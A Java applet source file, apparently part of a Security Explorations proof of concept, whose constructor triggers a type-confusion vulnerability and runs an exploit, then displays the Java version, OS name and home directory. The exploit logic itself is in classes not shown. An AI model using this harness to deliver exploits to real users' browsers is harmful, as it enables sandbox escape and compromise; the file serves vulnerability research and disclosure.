

/* THIS SOFTWARE IS PROTECTED BY DOMESTIC AND INTERNATIONAL COPYRIGHT LAWS    */
/* UNAUTHORISED COPYING OF THIS SOFTWARE IN EITHER SOURCE OR BINARY FORM IS   */
/* EXPRESSLY FORBIDDEN. ANY USE, INCLUDING THE REPRODUCTION, MODIFICATION,    */
/* DISTRIBUTION, TRANSMISSION, RE-PUBLICATION, STORAGE OR DISPLAY OF ANY      */
/* PART OF THE SOFTWARE, FOR COMMERCIAL OR ANY OTHER PURPOSES REQUIRES A      */
/* VALID LICENSE FROM THE COPYRIGHT HOLDER.                                   */

/* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS    */
/* OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,*/
/* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL    */
/* SECURITY EXPLORATIONS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, */
/* WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF  */
/* OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE     */
/* SOFTWARE.                                                                  */

import java.lang.*;
import java.util.Properties;
import java.applet.*;
import java.awt.*;

public class MaliciousApplet extends Applet 
{
  public static Dummy2 d2;
  
  public MaliciousApplet() 
  {
   try 
   {
    Vuln50.create_type_confusion();
    Exploit.run();
   } 
   catch (Throwable e) 
   {
    e.printStackTrace();
   }
  }
  
  public void paint(Graphics g) 
  {
    Properties p = System.getProperties();
    g.drawString("Hello MaliciousApplet", 50, 125);
    g.drawString("You are running ", 50, 150);
    g.drawString("Java version: " + p.getProperty("java.version"), 50, 175);
    g.drawString("OS: " + p.getProperty("os.name"), 50, 200);
    g.drawString("homedir: " + p.getProperty("user.home"), 50, 225);
  }
  
}
